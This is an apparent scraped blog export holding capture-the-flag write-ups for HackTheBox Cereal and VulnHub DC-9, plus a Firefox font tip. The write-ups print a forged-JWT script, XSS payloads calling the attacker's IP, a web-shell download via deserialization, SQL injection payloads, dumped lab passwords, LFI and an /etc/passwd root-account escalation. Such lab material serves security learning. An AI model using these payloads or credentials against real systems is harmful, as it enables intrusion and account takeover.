repository by issuing git log.\n Aside from the author\u0026rsquo;s names, one commit with the message \u0026ldquo;Security fixes\u0026rdquo; caught my attention.\nI immediately run git diff 8f2a 7bd9 to compare the first commit with the security fixes and that reveals a deleted JWT secret.\n It looks like the security fixes include prevention against deserialization attacks which I\u0026rsquo;ll note that as well as the secret:\n JWT secret: secretlhfIH\u0026amp;FY*#oysuflkhskjfhefesf  Source Code Analysis #1  I pointed my sh*tty explanation or at least how I understand it with // \u0026lt;== or # \u0026lt;== in the code snippet. Please, don\u0026rsquo;t bully me for this.\n App Overview The app consist of ASP.NET (back-end) and React (front-end).\n→ root@kali «source-cereal-git» «10.10.14.3» git:(master) $ tree -L 1 --dirsfirst . ├── ClientApp ├── Controllers ├── Migrations ├── Models ├── Pages ├── Properties ├── Services ├── ApplicationOptions.cs ├── appsettings.Development.json ├── appsettings.json ├── CerealContext.cs ├── Cereal.csproj ├── DownloadHelper.cs ├── ExtensionMethods.cs ├── IPAddressHandler.cs ├── IPRequirement.cs ├── Program.cs └── Startup.cs The source code of previously seen React app at cereal.htb is on the ClientApp folder.\nHere is the overview of app execution flow:\nProgram.cs | v Startup.cs -\u0026gt; Loads appsettings.json | v React client Looking into the appsettings.js, I could obtain the following information:\n There is IP whitelist There are two rules that looks like limiting requests and it\u0026rsquo;ll reset after certain period. One of them is limiting a post request to an endpoint called /requests.  { ...\u0026lt;SNIP\u0026gt;... \u0026#34;AllowedHosts\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;ApplicationOptions\u0026#34;: { \u0026#34;Whitelist\u0026#34;: [ \u0026#34;127.0.0.1\u0026#34;, \u0026#34;::1\u0026#34; ] }, \u0026#34;IpRateLimiting\u0026#34;: { \u0026#34;EnableEndpointRateLimiting\u0026#34;: true, \u0026#34;StackBlockedRequests\u0026#34;: false, \u0026#34;RealIpHeader\u0026#34;: \u0026#34;X-Real-IP\u0026#34;, \u0026#34;ClientIdHeader\u0026#34;: \u0026#34;X-ClientId\u0026#34;, \u0026#34;HttpStatusCode\u0026#34;: 429, \u0026#34;IpWhitelist\u0026#34;: [ \u0026#34;127.0.0.1\u0026#34;, \u0026#34;::1\u0026#34; ], \u0026#34;EndpointWhitelist\u0026#34;: [], \u0026#34;ClientWhitelist\u0026#34;: [], \u0026#34;GeneralRules\u0026#34;: [ { \u0026#34;Endpoint\u0026#34;: \u0026#34;post:/requests\u0026#34;, \u0026#34;Period\u0026#34;: \u0026#34;5m\u0026#34;, \u0026#34;Limit\u0026#34;: 2 }, { \u0026#34;Endpoint\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;Period\u0026#34;: \u0026#34;5m\u0026#34;, \u0026#34;Limit\u0026#34;: 150 } ] } } Authentication Vulnerability Looking into the Startup.cs file, I could see there is a potential authentication bypass. On the following code snippet, the application clearly doesn\u0026rsquo;t validate the issuer and the audience of a JWT token, and this can raise a security issue.\n...\u0026lt;SNIP\u0026gt;... var key = Encoding.ASCII.GetBytes(\u0026#34;*\u0026#34;); services.AddAuthentication(x =\u0026gt; { x.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme; x.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme; }) .AddJwtBearer(x =\u0026gt; { x.RequireHttpsMetadata = false; x.SaveToken = true; x.TokenValidationParameters = new TokenValidationParameters { ValidateIssuerSigningKey = true, IssuerSigningKey = new SymmetricSecurityKey(key), ValidateIssuer = false, // \u0026lt;== No validation  ValidateAudience = false // \u0026lt;== No validation  }; }); ...\u0026lt;SNIP\u0026gt;... The JWT token itself is forged at Services/UserService.cs:\npublic User Authenticate(string username, string password) { using (var db = new CerealContext()) { var user = db.Users.Where(x =\u0026gt; x.Username == username \u0026amp;\u0026amp; x.Password == password).SingleOrDefault(); // return null if user not found  if (user == null) return null; // authentication successful so generate jwt token  var tokenHandler = new JwtSecurityTokenHandler(); var key = Encoding.ASCII.GetBytes(\u0026#34;*\u0026#34;); var tokenDescriptor = new SecurityTokenDescriptor { Subject = new ClaimsIdentity(new Claim[] { new Claim(ClaimTypes.Name, user.UserId.ToString()) }), Expires = DateTime.UtcNow.AddDays(7), SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature) }; var token = tokenHandler.CreateToken(tokenDescriptor); user.Token = tokenHandler.WriteToken(token); return user.WithoutPassword(); } When the user attempts to authenticate, the code snippet above checks to see if the user\u0026rsquo;s credentials match those in the database. If the credentials match, the app will generate a JWT token for that user.\nThe user model is defined in here Models/User.cs. From here, I can assume each JWT token contains at least a user\u0026rsquo;s ID, expiration time (7 days), Username, and Token.\n...\u0026lt;SNIP\u0026gt;... public class User { [Key] public int UserId { get; set; } [Required] public string Username { get; set; } [Required] public string Password { get; set; } public string Token { get; set; } } ...\u0026lt;SNIP\u0026gt;... Interestingly, in ClientApp/src/LoginPage/LoginPage.jsx, the authentication process doesn\u0026rsquo;t look like it needs server/back-end validation, because it checks the browser\u0026rsquo;s local storage first.\n It\u0026rsquo;ll ask the server if we press the login button (POST request).\n ...\u0026lt;SNIP\u0026gt;... import { authenticationService } from \u0026#39;../_services\u0026#39;; // \u0026lt;==  class LoginPage extends React.Component { constructor(props) { super(props); // redirect to home if already logged in  if (authenticationService.currentUserValue) { // \u0026lt;==  this.props.history.push(\u0026#39;/\u0026#39;); } } render() { return ( \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;Login\u0026lt;/h2\u0026gt; ...\u0026lt;SNIP\u0026gt;... I could track the authenticationService.currentUserValue and it is defined in ClientApp/src/_services/authentication.service.jsx\nconst currentUserSubject = new BehaviorSubject(JSON.parse(localStorage.getItem(\u0026#39;currentUser\u0026#39;))); // \u0026lt;==  export const authenticationService = { login, logout, currentUser: currentUserSubject.asObservable(),// \u0026lt;==  get currentUserValue () { return currentUserSubject.value } // \u0026lt;== }; Authentication Bypass I could summarize the previous code analysis to these points:\n As long as the browser\u0026rsquo;s local storage contains a key of currentUser which has JWT token in its value, the client app will logs the user in. No other validation in JWT token except the user\u0026rsquo;s ID and expires date. (based on Services/UserService.cs) Based on Models/User.cs, Services/UserService.cs, and ClientApp/src/_services/auth-header.js , the form of currentUser is something like this:  \u0026quot;currentUser\u0026quot; : \u0026quot;{ \u0026quot;userId\u0026quot;: \u0026quot;0\u0026quot;, \u0026quot;username\u0026quot;: \u0026quot;name\u0026quot;, \u0026quot;token\u0026quot;: \u0026quot;JWT token\u0026quot;}\u0026quot;.    Tactics Here is the tactics to bypass the login page:\n Since there is no validation on the issuer, and I have the JWT secret key, I could forge my own JWT. I\u0026rsquo;ll put the forged JWT token to browser\u0026rsquo;s local storage of cereal.htb with the key name of currentUser. Simply refresh the page afterwards and see if it logs me in.  Forge JWT To forge our own JWT, you could try jwtool, but I tried to forge my own JWT using Golang lol.\nHere is the code:\npackage main import ( \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/dgrijalva/jwt-go\u0026#34; ) type UserService interface { CreateToken(userID string) string } type jwtService struct { secretKey string } func (s *jwtService) CreateToken() string { claims := jwt.StandardClaims{ ExpiresAt: time.Now().AddDate(0, 0, 7).UTC().Unix(), } token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims) t, err := token.SignedString([]byte(s.secretKey)) if err != nil { panic(err) } return t } type User struct { UserId string `json:\u0026#34;userId,omitempty\u0026#34;` Username string `json:\u0026#34;username,omitempty\u0026#34;` Token string `json:\u0026#34;token,omitempty\u0026#34;` } func main() { jwt := \u0026amp;jwtService{} jwt.secretKey = \u0026#34;secretlhfIH\u0026amp;FY*#oysuflkhskjfhefesf\u0026#34; cu := User{ UserId: \u0026#34;1\u0026#34;, Username: \u0026#34;iamf\u0026#34;, Token: jwt.CreateToken(), } currentUser, _ := json.Marshal(cu) fmt.Printf(\u0026#34;%s\u0026#34;, currentUser) } A bit messy but that\u0026rsquo;s work.\n→ root@kali «cereal» «10.10.14.3» $ go run main.go {\u0026#34;userId\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;iamf\u0026#34;,\u0026#34;token\u0026#34;:\u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjM4MTgwMzh9.XAcgRqhpgyJARsBMEWg1UOlUeRnQU4bvbk1SpAv3vDM\u0026#34;} Login Refreshing the page after storing the token into the browser\u0026rsquo;s local storage logs me in.\n Input testing When I submitted a URL which points to my attacking machine, I received a GET request coming from the Title field.\n Here how the request and response looks like.\n Source Code Analysis #2 I decided to mix it with images hehe.\nDeserialization Vulnerability Looking into the request controller, Controllers/RequestsController.cs, it turns out that each Cereal Request (POST) sent is saved in database without validation on the body request.\n Because the validation only is on the client side, I could send a cereal request in any format. Here is for example of what I mean:\n The cereal database\u0026rsquo;s name can be found inside CerealContext.cs\n Back into the request controller, there is a comment inside the Get function that points out about deserialization (previously seen at comparing the commit logs):\n...\u0026lt;SNIP\u0026gt;... [Authorize(Policy = \u0026#34;RestrictIP\u0026#34;)] [HttpGet(\u0026#34;{id}\u0026#34;)] public IActionResult Get(int id) { using (var db = new CerealContext()) { string json = db.Requests.Where(x =\u0026gt; x.RequestId == id).SingleOrDefault().JSON; // Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial  if (json.ToLower().Contains(\u0026#34;objectdataprovider\u0026#34;) || json.ToLower().Contains(\u0026#34;windowsidentity\u0026#34;) || json.ToLower().Contains(\u0026#34;system\u0026#34;)) { return BadRequest(new { message = \u0026#34;The cereal police have been dispatched.\u0026#34; }); } var cereal = JsonConvert.DeserializeObject(json, new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.Auto }); return Ok(cereal.ToString()); } } The Get function can only be accessed if the request IP is in the whitelist (defined in appsettings.json ) and it takes one parameter called id (GET /requests/{id}).\n[Authorize(Policy = \u0026#34;RestrictIP\u0026#34;)] [HttpGet(\u0026#34;{id}\u0026#34;)] This code blocks the gadget classes used for .NET deserialization attack.\nif (json.ToLower().Contains(\u0026#34;objectdataprovider\u0026#34;) || json.ToLower().Contains(\u0026#34;windowsidentity\u0026#34;) || json.ToLower().Contains(\u0026#34;system\u0026#34;)) But, there is a class called DownloadHelper that has a function which can be used to send a download request:\n...\u0026lt;SNIP\u0026gt;... public class DownloadHelper { private String _URL; private String _FilePath; public String URL ...\u0026lt;SNIP\u0026gt;... private void Download() { using (WebClient wc = new WebClient()) { if (!string.IsNullOrEmpty(_URL) \u0026amp;\u0026amp; !string.IsNullOrEmpty(_FilePath)) { wc.DownloadFile(_URL, ReplaceLastOccurrence(_FilePath,\u0026#34;\\\\\u0026#34;, \u0026#34;\\\\21098374243-\u0026#34;)); } } } I could use DownloadHelper class to download a web shell hosted on my machine by sending a serialized form of this class via the Cereal Request.\nThe problem here I couldn\u0026rsquo;t make a GET request to requests/{id} because there is an IP restriction policy.\nXSS Vulnerability When tracking down where the previous GET request coming, I find out that each Cereal Request sent lands on the admin page (AdminPage.jsx).\n And one of the app library that is used in the admin page called react-marked-down has an XSS vulnerability.\n...\u0026lt;SNIP\u0026gt;... \u0026lt;Accordion.Toggle as={Button} variant=\u0026#34;link\u0026#34; eventKey={this.props.request.requestId} name=\u0026#34;expand\u0026#34; id={this.props.request.requestId}\u0026gt; {requestData \u0026amp;\u0026amp; requestData.title \u0026amp;\u0026amp; typeof requestData.title == \u0026#39;string\u0026#39; \u0026amp;\u0026amp; \u0026lt;MarkdownPreview markedOptions={{ sanitize: true }} value={requestData.title} /\u0026gt; // \u0026lt;== ...\u0026lt;SNIP\u0026gt;... I could confirm the vulnerability with the following payload:\n[XSS](javascript: document.write`\u0026lt;img src='http://10.10.14.3/iamf'/\u0026gt;`)  With a few experiments, URL encoding seems to work as well\n[XSS](javascript: document.write%28%22\u0026lt;img src=\u0026#39;http://10.10.14.3/iamf\u0026#39;\u0026gt;%22%29) Foothold Shell as Sonny Web Shell Upload via XSS and Deserialization I\u0026rsquo;ll summarize that:\n There is an uploads directory at https://source.cereal.htb/uploads/. From the previous code analysis, the gadget class are filtered, but there is one class called DownloadHelper that can be accessed and it has a download function. There is a SSRF (not sure yet) in the Title section, which can be used along with the XSS vulnerability to bypass the IP restriction.  The tactics:\n Serialized DownloadHelper class which contains a web shell URL that points to the attacking machine, and send it via the Cereal Request, note the ID. Use XSS which bypasses the IP restriction, to make a GET request to cereal.htb/request/{the ID} to trigger the deserialization, Confirms the web shell at https://cereal.source.htb/uploads/shell-name.aspx  I already made a script to chain those vulnerabilities:\n  That\u0026rsquo;s on different IP because I decided to ran the exploit again to make sure it\u0026rsquo;s still work XD\n I can access my web shell on http://source.cereal.htb/uploads/iamf.aspx\n SSH - sonny A quick check on the web directory, I find the cereal.db at c:\\inetpub\\cereal\\db\\cereal.db and it contains a string that looks like a set of credentials.\n I tried it on SSH (sonny:mutual.madden.manner38974) and it worked.\n→ root@kali «exploits» «10.10.14.2» $ ssh sonny@cereal.htb sonny@cereal.htb\u0026#39;s password: Microsoft Windows [Version 10.0.17763.1817] (c) 2018 Microsoft Corporation. All rights reserved. sonny@CEREAL C:\\Users\\sonny\u0026gt;dir desktop\\ Volume in drive C has no label. Volume Serial Number is C4EF-2153 Directory of C:\\Users\\sonny\\desktop 11/16/2020 05:19 AM \u0026lt;DIR\u0026gt; . 11/16/2020 05:19 AM \u0026lt;DIR\u0026gt; .. 06/07/2021 09:59 PM 34 user.txt 1 File(s) 34 bytes 2 Dir(s) 7,621,619,712 bytes free Privilege Escalation It\u0026rsquo;s retired already.\nReferences  https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0 https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-cereal/","summary":"Cereal is a hard difficulty Windows machine that features a misconfigured web server which exposes source code of the currently hosted web application. A deleted JWT secrets is found in the source code, which can be used to forge my own JWT token and bypass the application login page. After reviewing the source code, the web app is found to be vulnerable to a deserialization attack. There is also a XSS vulnerability in one of the package used by the application.","tags":["Windows",".git",".NET","Code-review","JWT","Deserialization","XSS","Python"],"title":"HackTheBox - Cereal (User only)"},{"content":"For Web development, I prefer Firefox, particularly I like the right-click + Q shortcut for inspecting elements. However, there is one issue that bothers me, and it\u0026rsquo;s the font smoothing.\nSomehow, Firefox renders fonts as if it\u0026rsquo;s in high contrast mode or without anti-alias. So in this post, I\u0026rsquo;ll share what I\u0026rsquo;ve found as a workaround to \u0026lsquo;fix\u0026rsquo; that.\nOpen Firefox and type about:config in the address bar.\n Search for this string.\ngfx.font_rendering.cleartype_params.enhanced_contrast Change the value to 0.\n Result 👇\n It\u0026rsquo;s not that smooth like in Chrome, but a little bit better 😺.\n","permalink":"https://fahmifj.github.io/blog/font-smoothing-in-firefox/","summary":"For Web development, I prefer Firefox, particularly I like the right-click + Q shortcut for inspecting elements. However, there is one issue that bothers me, and it\u0026rsquo;s the font smoothing.\nSomehow, Firefox renders fonts as if it\u0026rsquo;s in high contrast mode or without anti-alias. So in this post, I\u0026rsquo;ll share what I\u0026rsquo;ve found as a workaround to \u0026lsquo;fix\u0026rsquo; that.\nOpen Firefox and type about:config in the address bar.\n Search for this string.","tags":["nanoblog"],"title":"Font Smoothing in Firefox"},{"content":"DC-9 from VulnHub features a website that is vulnerable to SQL injection. I’m able to dump a bunch of users’ credentials by leveraging the SQLi and gain a foothold a on the system after spraying these credentials on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.\nActually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule.\nEven though I gained a foothold by skipping the LFI and port knocking, I\u0026rsquo;ll still include the intended way (LFI and port knocking) in the foothold section.\nSkills Learned  Blind SQL injection Local file Inclusion Port knocking  Tools  Nmap Arpscan SQLMap CrackMapExec  Reconnaissance Host Discovery - arp-scan 192.168.2.102 is the target.\n→ root@iamf «dc-9» «192.168.2.103» $ arp-scan --interface eth0 192.168.2.0/24 | tee scans/00-arp-scan Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.2.2 0a:00:27:00:00:0a (Unknown: locally administered) 192.168.2.1 08:00:27:d9:63:87 PCS Systemtechnik GmbH 192.168.2.102 08:00:27:54:bc:fd PCS Systemtechnik GmbH 3 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.9.7: 256 hosts scanned in 1.986 seconds (128.90 hosts/sec). 3 responded Port Scan - nmap nmap shows two ports available, 80 (HTTP) and 22 (SSH). SSH port is in filtered state.\n→ root@iamf «dc-9» «192.168.2.103» $ nmap -n -sC -sV -oA scans/10-initial-dc9 \u0026#39;192.168.2.102\u0026#39; -v # Nmap 7.80 scan initiated Thu Apr 8 02:43:51 2021 as: nmap -n -sC -sV -oA scans/10-initial-dc9 -v 192.168.2.102 Nmap scan report for 192.168.2.102 Host is up (0.00048s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp filtered ssh 80/tcp open http Apache httpd 2.4.38 ((Debian)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Example.com - Staff Details - Welcome MAC Address: 08:00:27:54:BC:FD (Oracle VirtualBox virtual NIC) But, later it turns into open state after a full port scan performed.\n→ root@iamf «dc-9» «192.168.2.103» $ nmap -n -p22 192.168.2.102 Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-08 05:21 EDT Nmap scan report for 192.168.2.102 Host is up (0.00075s latency). PORT STATE SERVICE 22/tcp open ssh MAC Address: 08:00:27:54:BC:FD (Oracle VirtualBox virtual NIC) I can confirms it with netcat.\n→ root@iamf «dc-9» «192.168.2.103» $ nc 192.168.2.102 22 SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1 Enumeration TCP 80 - Website The home page of this site doesn\u0026rsquo;t provide anything useful.\n The Display All Records menu functions to display all user records.\n There is a user input on the Search menu\n The Manage menu has login function.\n From here I can assume that the website uses database.\nError-based SQL injection - Detection There\u0026rsquo;s error-based SQL injection on search.php. The initial detection is simple, when I try put ' it gives bug (joke reference ).\nI detected the SQLi vulnerability by adding a single quote ( ' ) at the end of user\u0026rsquo;s first name that I want to search.\n Based on the search page, you can only input one name (either the first or the last name) and it will return a single record, so without ', the search should return one related result.\n But then, if I submit ' OR 1=1 -- -', it returns all the records.\n Error-based SQL injection - Database examination There are 6 columns available and the data type of each columns is string. The query as follows:\n\u0026#39; UNION SELECT \u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;f\u0026#39; --  I’ll pull out database version, current database, and the available databases using this query:\n\u0026#39; UNION SELECT @@version, \u0026#39;Current DB:\u0026#39;, database(), group_concat(SCHEMA_NAME),5,6 FROM information_schema.schemata -- -  The website uses MariaDB as its database. The database currently in use is Staff. Staff and users are non-default database, so I\u0026rsquo;ll look into their tables.\nWith the following query, I can get the two tables name from database Staff: StaffDetails and Users.\n\u0026#39;UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables where table_schema = \u0026#39;Staff\u0026#39; -- -  StaffDetails contains the all the staff records which previously seen at the Display All Records menu.\nSo, I’ll get the columns on table Users with the following query:\n\u0026#39;UNION SELECT group_concat(column_name), 2,3,4,5,6 from information_schema.columns where table_name = \u0026#39;Users\u0026#39; -- -  With the following query, I can get the contents of the Username and Password columns:\n\u0026#39; UNION SELECT group_concat(username, \u0026#39;:\u0026#39;, password),2,3,4,5,6 FROM Users -- -  The password is in md5 format.\n→ root@iamf «dc-9» «192.168.2.103» $ echo 856f5de590ef37314e7c3bdf6f8a66dc | wc -c 33 The hash can be cracked online. The credentials is admin:transorbital1, and I’ll just keep that for now.\n On database users, there is only one table called UserDetails. Here is the query.\n\u0026#39;UNION SELECT group_concat(table_name),2,3,4,5,6 FROM information_schema.tables where table_schema = \u0026#39;users\u0026#39; -- -  With the following query, I can get the columns on table UserDetails.\n\u0026#39; UNION SELECT group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name = \u0026#39;UserDetails\u0026#39; -- -  UserDetails has 6 columns, but I\u0026rsquo;m interested only with the username and the password column, and I\u0026rsquo;ll pull out the their contents with the following query.\n\u0026#39; UNION SELECT group_concat(username,\u0026#34;:\u0026#34;,password),2,3,4,5,6 FROM users.UserDetails -- -  That\u0026rsquo;s a lot of credentials. I can sort those creds with sed command by substituting comma with new line.\n→ root@iamf «dc-9» «192.168.2.103» $ echo -n \u0026#39;marym:3kfs86sfd,julied:468sfdfsd2,fredf:4sfd87sfd1,barneyr:RocksOff,tomc:TC\u0026amp;TheBoyz,jerrym:B8m#48sd,wilmaf:Pebbles,bettyr:BamBam01,chandlerb:UrAG0D!,joeyt:Passw0rd,rachelg:yN72#dsd,rossg:ILoveRachel,monicag:3248dsds7s,phoebeb:smellycats,scoots:YR3BVxxxw87,janitor:Ilovepeepee,janitor2:Hawaii-Five-0\u0026#39; | sed -s \u0026#39;s/,/\\n/g\u0026#39; marym:3kfs86sfd julied:468sfdfsd2 fredf:4sfd87sfd1 barneyr:RocksOff tomc:TC\u0026amp;TheBoyz jerrym:B8m#48sd wilmaf:Pebbles bettyr:BamBam01 chandlerb:UrAG0D! joeyt:Passw0rd rachelg:yN72#dsd rossg:ILoveRachel monicag:3248dsds7s phoebeb:smellycats scoots:YR3BVxxxw87 janitor:Ilovepeepee janitor2:Hawaii-Five-0 Foothold Shell as chandlerb, joeyt, janitor SSH Brute-force Since the SSH port is open, I tried all the credentials I obtained from SQLi on SSH using crackmapexec. It returned 3 valid logins.\n→ root@iamf «dc-9» «192.168.2.103» $ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success SSH 192.168.2.102 22 192.168.2.102 [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1 ...\u0026lt;SNIP\u0026gt;... SSH 192.168.2.102 22 192.168.2.102 [+] chandlerb:UrAG0D! SSH 192.168.2.102 22 192.168.2.102 [+] joeyt:Passw0rd ...\u0026lt;SNIP\u0026gt;... SSH 192.168.2.102 22 192.168.2.102 [+] janitor:Ilovepeepee ...\u0026lt;SNIP\u0026gt;... (Intended) LFI and Port Knocking I discovered a LFI on the website after inspecting one of its source code.\nchandlerb@dc-9:/var/www/html$ cat manage.php \u0026lt;?php $file = 'contact-info.php'; $show_errors = $_SESSION['display_errors']; if ($show_errors == 'yes') { if(file_exists($file)) { include($file); } else { echo \u0026quot;File does not exist\u0026quot; . \u0026quot;\u0026lt;br /\u0026gt;\u0026quot;; # LFI vulnerability starts from here $file = $_GET['file']; # No input sanitization poc: manage?file=../../../../etc/passwd include('directory/' . $file); } ...\u0026lt;SNIP\u0026gt;... Using LFI is the intended way to gain a foothold before performing brute force.\n Log into the website using admin:transorbital1.\n With LFI I can include /etc/knockd.conf to read the knocking sequence to open the SSH port.\n In case the SSH port is closed, then to open it, I\u0026rsquo;ll need to interact with port 7469,8475,9842 sequentially.\nfor i in 7469 8475 9842; do nc -w1 192.168.2.102 $i; done;  To close the port, I\u0026rsquo;ll need to knock in reverse order:\nfor i in 9842 8475 7469; do nc -w1 192.168.2.102 $i; done;  Then, from here, I should use SSH brute force (which I did earlier).\nPrivilege Escalation Shell as fredf Enumeration Only user janitor that has one valuable thing in its home dir, and that is a password list.\njanitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt BamBam01 Passw0rd smellycats P0Lic#10-4 B4-Tru3-001 4uGU5T-NiGHts With those new password, I\u0026rsquo;ll perform another brute force using crackmapexec.\nSSH - fredf crackmapexec returns one valid login for fred:B4-Tru3-001.\n→ root@iamf «dc-9» «192.168.2.103» $ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success SSH 192.168.2.102 22 192.168.2.102 [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1 ... SSH 192.168.2.102 22 192.168.2.102 [+] fredf:B4-Tru3-001 ... → root@iamf «dc-9» «192.168.2.103» $ ssh fredf@192.168.2.102 fredf@192.168.2.102\u0026#39;s password: Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Apr 8 20:10:42 2021 from 192.168.2.103 fredf@dc-9:~$ id uid=1003(fredf) gid=1003(fredf) groups=1003(fredf) Shell as root Sudo privileges - Arbitrary file write User fredf has sudo privileges on a custom binary called test\nfredf@dc-9:/home$ sudo -l Matching Defaults entries for fredf on dc-9: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User fredf may run the following commands on dc-9: (root) NOPASSWD: /opt/devstuff/dist/test/test I suspect /opt/devstuff/test.py is the actual code of that binary.\nfredf@dc-9:/opt/devstuff$ cat test.py #!/usr/bin/python import sys if len (sys.argv) != 3 : print (\u0026#34;Usage: python test.py read append\u0026#34;) sys.exit (1) else : f = open(sys.argv[1], \u0026#34;r\u0026#34;) output = (f.read()) f = open(sys.argv[2], \u0026#34;a\u0026#34;) f.write(output) f.close() Let\u0026rsquo;s break it down.\nIt checks if the arguments are equal to 3. If it doesn\u0026rsquo;t have 3 arguments, it exits.\nif len (sys.argv) != 3 : print (\u0026#34;Usage: python test.py read append\u0026#34;) sys.exit (1) Otherwise, it reads a file specified on argv1 in read mode and store its contents to the variable output.\nelse : f = open(sys.argv[1], \u0026#34;r\u0026#34;) output = (f.read()) Then it opens a file specified on argv2 in append mode and it adds the variable output (the file contents of argv1) to that file.\nf = open(sys.argv[2], \u0026#34;a\u0026#34;) f.write(output) f.close() This can be exploited in many ways, and one of them is to add a new root account to /etc/passwd.\nFirst, I\u0026rsquo;ll create a password hash using openssl command.\nfredf@dc-9:/tmp$ openssl passwd -1 -salt iamf pass123 $1$iamf$lq0NuDAhNy8IFlaFgiRw20 I\u0026rsquo;ll follow the flat database format of /etc/passwd to create my own user. I\u0026rsquo;ll use the field property of root user, and substitute the password (x field) and the username with the one I specified.\nHere is what I mean:\n# From this root:x:0:0:root:/root:/bin/bash # To iamf:$1$iamf$lq0NuDAhNy8IFlaFgiRw20:0:0:root:/root:/bin/bash I\u0026rsquo;ll store that to a file called /tmp/passwd.\nAnd now I can just append the content of /tmp/passwd to /etc/passwd using /opt/devstuff/dist/test/test.\nfredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test /tmp/passwd /etc/passwd I can confirms my account is there (/etc/passwd).\nfredf@dc-9:/tmp$ cat /etc/passwd ... janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash iamf:$1$iamf$lq0NuDAhNy8IFlaFgiRw20:0:0:root:/root:/bin/bash SU - root Now I can switch to my account and get a root shell.\nfredf@dc-9:/tmp$ su iamf Password: pass123 root@dc-9:/tmp# And here is the flag,\nroot@dc-9:~# cat theflag.txt ███╗ ██╗██╗ ██████╗███████╗ ██╗ ██╗ ██████╗ ██████╗ ██╗ ██╗██╗██╗██╗ ████╗ ██║██║██╔════╝██╔════╝ ██║ ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║ ██╔██╗ ██║██║██║ █████╗ ██║ █╗ ██║██║ ██║██████╔╝█████╔╝ ██║██║██║ ██║╚██╗██║██║██║ ██╔══╝ ██║███╗██║██║ ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝ ██║ ╚████║██║╚██████╗███████╗ ╚███╔███╔╝╚██████╔╝██║ ██║██║ ██╗██╗██╗██╗ ╚═╝ ╚═══╝╚═╝ ╚═════╝╚══════╝ ╚══╝╚══╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝╚═╝╚═╝ Congratulations - you have done well to get to this point. Hope you enjoyed DC-9. Just wanted to send out a big thanks to all those who have taken the time to complete the various DC challenges. I also want to send out a big thank you to the various members of @m0tl3ycr3w . They are an inspirational bunch of fellows. Sure, they might smell a bit, but...just kidding. :-) Sadly, all things must come to an end, and this will be the last ever challenge in the DC series. So long, and thanks for all the fish. That\u0026rsquo;s all, thanks for reading.\n References  https://www.vulnhub.com/entry/dc-6,315/ https://crackstation.net/ https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/  ","permalink":"https://fahmifj.github.io/writeups/vulnhub/vh-dc9/","summary":"DC-9 from VulnHub features a website that is vulnerable to SQL injection. I’m able to dump a bunch of users’ credentials by leveraging the SQLi and gain a foothold a on the system after spraying these credentials on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.\nActually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule.","tags":["OSCP-like","Linux","Port-knocking","SQL-injection","LFI","sudo","Arbitrary-file-write","SQLMap","Openssl"],"title":"VulnHub - DC-9"},{"content":"In this post, I would like to share a quick tutorial (I guess) on how to setup a VulnHub machine in your local network. I’ll assume that you are already familiar with software installation, know what Host OS-Guest OS is, and IP address.\nWhat is VulnHub? VulnHub is a website that provides vulnerable virtual machines (VMs) for those who wants to gain a practical experience in penetration testing. It similar with Hack The Box and TryHackMe, but with VulnHub you can practice locally. Because Windows machine requires a license, most VulnHub machines are Linux server.\nThere are a lot of things you can do with VulnHub machines after you get a root, such as:\n 